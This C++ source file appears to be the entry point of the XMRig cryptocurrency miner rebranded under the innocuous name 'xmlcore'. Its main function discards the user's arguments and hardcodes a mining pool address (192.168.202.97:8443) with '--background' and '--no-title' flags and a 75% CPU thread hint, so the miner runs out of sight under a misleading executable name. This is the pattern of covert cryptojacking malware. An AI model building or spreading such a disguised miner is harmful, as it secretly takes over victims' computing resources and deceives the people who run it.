/* xmlcore
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 xmlcore       <https://github.com/xmlcore>, <support@xmlcore.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include <stdio.h>


int main(int argc, char **argv) {
    using namespace xmlcore;
    char  arg0[] = "xmlcore.exe";
    char  arg1[] = "-o";
    char  arg2[] = "192.168.202.97:8443";
    char  arg3[] = "--background";
    char  arg4[] = "--no-title";
    char  arg5[] = "--nicehash";
    char arg6[] = "--cpu-max-threads-hint";
    char arg7[] = "75";

    char *argvv[] = { &arg0[0], &arg1[0], &arg2[0], &arg3[0], &arg4[0], &arg5[0], &arg6[0], &arg7[0], NULL };
    int   argcc   = (int)(sizeof(argvv) / sizeof(argvv[0])) - 1;
    // for(int i = 0; i < argcc; i++)
    //    printf("%s\n", argvv[i]);

    Process process(argcc, &argvv[0]);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
